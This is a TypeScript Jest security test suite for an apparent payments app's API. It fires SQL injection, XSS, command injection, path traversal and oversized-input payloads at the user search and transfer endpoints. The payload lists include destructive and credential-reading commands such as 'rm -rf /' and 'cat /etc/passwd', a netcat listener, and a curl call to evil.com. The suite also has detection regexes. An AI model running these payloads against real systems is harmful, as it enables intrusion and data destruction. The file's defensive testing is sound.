import { describe, test, expect, beforeAll } from '@jest/globals'
import { getRealSupabaseJWT } from '../utils/supabase-auth'
import { apiClient } from '../utils/api-client'

describe('Security Tests - Input Validation', () => {
  let authToken: string
  let userId: string

  beforeAll(async () => {
    console.log('🔐 Setting up input validation security tests...')

    try {
      const tokenData = await getRealSupabaseJWT()
      authToken = tokenData.token
      userId = tokenData.userId
      console.log('✅ Security test setup completed')
      console.log(`🔧 User ID: ${userId}`)
    } catch (error) {
      console.error('❌ Failed to setup security tests:', error)
      throw error
    }
  })

  describe('4.2 Input Validation Security', () => {
    describe('SQL Injection Prevention', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --"
      ]

      test('should prevent SQL injection in user search', async () => {
        console.log('🔍 Testing SQL injection prevention in user search...')

        const results = []

        for (const payload of sqlInjectionPayloads) {
          try {
            const response = await apiClient.searchUsers(authToken, payload)

            results.push({
              payload,
              status: response.status,
              prevented: response.status === 400 || response.status === 401 || response.status === 422,
              hasData: response.status === 200 && response.body?.users?.length > 0
            })

            // Should not return unauthorized data or cause server errors
            expect(response.status).not.toBe(500) // No server crashes

            if (response.status === 200) {
              // If successful, should return normal search results, not all users
              expect(response.body.users).toBeDefined()
              expect(Array.isArray(response.body.users)).toBe(true)
              // Should not return excessive data (sign of successful injection)
              expect(response.body.users.length).toBeLessThan(100)
            }
          } catch (error) {
            results.push({
              payload,
              status: 'error',
              prevented: true,
              error: error.message
            })
          }
        }

        console.log('📊 SQL Injection Test Results:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.prevented ? '✅' : '❌'} Status: ${result.status} - ${result.payload.substring(0, 30)}...`)
        })

        // At least 80% of payloads should be prevented or handled safely
        const preventedCount = results.filter(r => r.prevented).length
        const preventionRate = preventedCount / results.length

        console.log(`🛡️ SQL Injection Prevention Rate: ${(preventionRate * 100).toFixed(1)}%`)
        expect(preventionRate).toBeGreaterThan(0.8)
      })

      test('should prevent SQL injection in transfer operations', async () => {
        console.log('🔍 Testing SQL injection prevention in transfers...')

        const results = []

        for (const payload of sqlInjectionPayloads.slice(0, 5)) { // Test subset for transfers
          try {
            const response = await apiClient.sendTransfer(authToken, {
              recipientId: payload,
              amount: 10,
              currency: 'AOA',
              description: 'Test transfer'
            })

            results.push({
              payload,
              status: response.status,
              prevented: response.status === 400 || response.status === 401 || response.status === 422 || response.status === 404,
              isValidationError: response.status === 400 || response.status === 401 || response.status === 422
            })

            // Should not cause server errors
            expect(response.status).not.toBe(500)

            // Should not succeed with malicious recipient ID
            expect(response.status).not.toBe(200)
          } catch (error) {
            results.push({
              payload,
              status: 'error',
              prevented: true,
              error: error.message
            })
          }
        }

        console.log('📊 Transfer SQL Injection Prevention:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.prevented ? '✅' : '❌'} Status: ${result.status}`)
        })

        // All transfer attempts with SQL injection should be prevented
        const preventedCount = results.filter(r => r.prevented).length
        expect(preventedCount).toBe(results.length)
      })
    })

    describe('XSS Payload Injection Prevention', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<div onclick="alert(1)">Click me</div>',
        '<input type="text" value="" onfocus="alert(1)" autofocus>',
        'eval("alert(1)")'
      ]

      test('should sanitize XSS payloads in user search', async () => {
        console.log('🔍 Testing XSS prevention in user search...')

        const results = []

        for (const payload of xssPayloads) {
          try {
            const response = await apiClient.searchUsers(authToken, payload)

            results.push({
              payload: payload.substring(0, 30) + '...',
              status: response.status,
              sanitized: response.status === 401 || (response.status === 200 && !containsUnsafeContent(response.body)),
              hasUnsafeContent: response.status === 200 && containsUnsafeContent(response.body)
            })

            if (response.status === 200 && response.body) {
              // Response should not contain executable script tags or event handlers
              const responseStr = JSON.stringify(response.body)
              expect(responseStr).not.toMatch(/<script/i)
              expect(responseStr).not.toMatch(/javascript:/i)
              expect(responseStr).not.toMatch(/onerror=/i)
              expect(responseStr).not.toMatch(/onload=/i)
              expect(responseStr).not.toMatch(/onclick=/i)
            }
          } catch (error) {
            results.push({
              payload: payload.substring(0, 30) + '...',
              status: 'error',
              sanitized: true,
              error: error.message
            })
          }
        }

        console.log('📊 XSS Prevention Results:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.sanitized ? '✅' : '❌'} Status: ${result.status} - ${result.payload}`)
        })

        // All responses should be sanitized
        const sanitizedCount = results.filter(r => r.sanitized).length
        expect(sanitizedCount).toBe(results.length)
      })

      test('should sanitize XSS payloads in transfer descriptions', async () => {
        console.log('🔍 Testing XSS prevention in transfer descriptions...')

        const results = []

        for (const payload of xssPayloads.slice(0, 5)) {
          try {
            const response = await apiClient.sendTransfer(authToken, {
              recipientId: userId, // Self-transfer for testing
              amount: 1,
              currency: 'AOA',
              description: payload
            })

            results.push({
              payload: payload.substring(0, 30) + '...',
              status: response.status,
              handled: response.status === 400 || response.status === 401 || response.status === 422 || response.status === 200
            })

            // Should either reject malicious content or sanitize it
            if (response.status === 200) {
              // If accepted, check that response doesn't contain unsafe content
              const responseStr = JSON.stringify(response.body)
              expect(responseStr).not.toMatch(/<script/i)
              expect(responseStr).not.toMatch(/javascript:/i)
            }
          } catch (error) {
            results.push({
              payload: payload.substring(0, 30) + '...',
              status: 'error',
              handled: true
            })
          }
        }

        console.log('📊 Transfer Description XSS Prevention:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.handled ? '✅' : '❌'} Status: ${result.status} - ${result.payload}`)
        })

        // All XSS attempts should be handled safely
        const handledCount = results.filter(r => r.handled).length
        expect(handledCount).toBe(results.length)
      })
    })

    describe('Command Injection Prevention', () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '| nc -l 4444',
        '&& curl http://evil.com',
        '; ping google.com',
        '`cat /etc/hosts`'
      ]

      test('should prevent command injection in user search', async () => {
        console.log('🔍 Testing command injection prevention in user search...')

        const results = []

        for (const payload of commandInjectionPayloads) {
          try {
            const response = await apiClient.searchUsers(authToken, payload)

            results.push({
              payload: payload.substring(0, 20) + '...',
              status: response.status,
              prevented: response.status !== 500, // Should not cause server errors
              isNormalResponse: response.status === 200 || response.status === 400 || response.status === 422
            })

            // Should not cause server crashes or expose system information
            expect(response.status).not.toBe(500)

            if (response.status === 200 && response.body) {
              // Should not contain system information
              const responseStr = JSON.stringify(response.body)
              expect(responseStr).not.toMatch(/root:/i)
              expect(responseStr).not.toMatch(/\/etc\//i)
              expect(responseStr).not.toMatch(/uid=/i)
              expect(responseStr).not.toMatch(/gid=/i)
            }
          } catch (error) {
            results.push({
              payload: payload.substring(0, 20) + '...',
              status: 'error',
              prevented: true
            })
          }
        }

        console.log('📊 Command Injection Prevention Results:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.prevented ? '✅' : '❌'} Status: ${result.status} - ${result.payload}`)
        })

        // All command injection attempts should be prevented
        const preventedCount = results.filter(r => r.prevented).length
        expect(preventedCount).toBe(results.length)
      })

      test('should prevent command injection in transfer descriptions', async () => {
        console.log('🔍 Testing command injection prevention in transfers...')

        const results = []

        for (const payload of commandInjectionPayloads.slice(0, 5)) {
          try {
            const response = await apiClient.sendTransfer(authToken, {
              recipientId: userId,
              amount: 1,
              currency: 'AOA',
              description: payload
            })

            results.push({
              payload: payload.substring(0, 20) + '...',
              status: response.status,
              prevented: response.status !== 500
            })

            // Should not cause server errors
            expect(response.status).not.toBe(500)
          } catch (error) {
            results.push({
              payload: payload.substring(0, 20) + '...',
              status: 'error',
              prevented: true
            })
          }
        }

        console.log('📊 Transfer Command Injection Prevention:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.prevented ? '✅' : '❌'} Status: ${result.status} - ${result.payload}`)
        })

        const preventedCount = results.filter(r => r.prevented).length
        expect(preventedCount).toBe(results.length)
      })
    })

    describe('Path Traversal Prevention', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '\\..\\..\\..\\etc\\passwd',
        '....\\\\....\\\\....\\\\etc\\\\passwd'
      ]

      test('should prevent path traversal in user search', async () => {
        console.log('🔍 Testing path traversal prevention in user search...')

        const results = []

        for (const payload of pathTraversalPayloads) {
          try {
            const response = await apiClient.searchUsers(authToken, payload)

            results.push({
              payload: payload.substring(0, 25) + '...',
              status: response.status,
              prevented: response.status !== 500,
              noSystemFiles: !containsSystemFileContent(response.body)
            })

            // Should not expose system files
            expect(response.status).not.toBe(500)

            if (response.status === 200 && response.body) {
              expect(containsSystemFileContent(response.body)).toBe(false)
            }
          } catch (error) {
            results.push({
              payload: payload.substring(0, 25) + '...',
              status: 'error',
              prevented: true,
              noSystemFiles: true
            })
          }
        }

        console.log('📊 Path Traversal Prevention Results:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.prevented && result.noSystemFiles ? '✅' : '❌'} Status: ${result.status} - ${result.payload}`)
        })

        // All path traversal attempts should be prevented
        const preventedCount = results.filter(r => r.prevented && r.noSystemFiles).length
        expect(preventedCount).toBe(results.length)
      })
    })

    describe('Buffer Overflow Prevention', () => {
      test('should handle extremely long input strings', async () => {
        console.log('🔍 Testing buffer overflow prevention with long strings...')

        const longStrings = [
          'A'.repeat(1000),      // 1KB
          'B'.repeat(10000),     // 10KB
          'C'.repeat(100000),    // 100KB
          'D'.repeat(1000000),   // 1MB
        ]

        const results = []

        for (let i = 0; i < longStrings.length; i++) {
          const payload = longStrings[i]
          const size = payload.length

          try {
            const response = await apiClient.searchUsers(authToken, payload)

            results.push({
              size: `${(size / 1000).toFixed(0)}KB`,
              status: response.status,
              handled: response.status === 400 || response.status === 401 || response.status === 422 || response.status === 413 || response.status === 431 || response.status === 200,
              noServerError: response.status !== 500
            })

            // Should not cause server crashes
            expect(response.status).not.toBe(500)

            // Should either reject or handle gracefully
            expect([200, 400, 401, 413, 422, 431]).toContain(response.status)
          } catch (error) {
            results.push({
              size: `${(size / 1000).toFixed(0)}KB`,
              status: 'error',
              handled: true,
              noServerError: true,
              error: error.message
            })
          }
        }

        console.log('📊 Buffer Overflow Prevention Results:')
        results.forEach((result, index) => {
          console.log(`   ${index + 1}. ${result.handled && result.noServerError ? '✅' : '❌'} ${result.size} - Status: ${result.status}`)
        })

        // All large inputs should be handled safely
        const handledCount = results.filter(r => r.handled && r.noServerError).length
        expect(handledCount).toBe(results.length)
      })

      test('should handle deeply nested JSON structures', async () => {
        console.log('🔍 Testing deeply nested structure handling...')

        // Create deeply nested object
        let nestedObj: any = { value: 'test' }
        for (let i = 0; i < 100; i++) {
          nestedObj = { nested: nestedObj }
        }

        try {
          const response = await apiClient.sendTransfer(authToken, {
            recipientId: userId,
            amount: 1,
            currency: 'AOA',
            description: JSON.stringify(nestedObj).substring(0, 1000) // Truncate to reasonable size
          })

          // Should handle gracefully without server errors
          expect(response.status).not.toBe(500)
          expect([200, 400, 422]).toContain(response.status)

          console.log('✅ Deeply nested structure handled safely')
        } catch (error) {
          // Network or parsing errors are acceptable
          console.log('✅ Deeply nested structure rejected safely')
          expect(error.message).toBeDefined()
        }
      })
    })
  })

})

// Helper functions for security testing
function containsSystemFileContent(data: any): boolean {
  if (!data) return false

  const dataStr = JSON.stringify(data)
  const systemFilePatterns = [
    /root:/i,
    /\/etc\//i,
    /\/var\//i,
    /\/usr\//i,
    /\/bin\//i,
    /\/sbin\//i,
    /passwd/i,
    /shadow/i,
    /hosts/i,
    /system32/i,
    /windows/i
  ]

  return systemFilePatterns.some(pattern => pattern.test(dataStr))
}

function containsUnsafeContent(data: any): boolean {
  const dataStr = JSON.stringify(data)
  const unsafePatterns = [
    /<script/i,
    /javascript:/i,
    /onerror=/i,
    /onload=/i,
    /onclick=/i,
    /onfocus=/i,
    /eval\(/i
  ]

  return unsafePatterns.some(pattern => pattern.test(dataStr))
}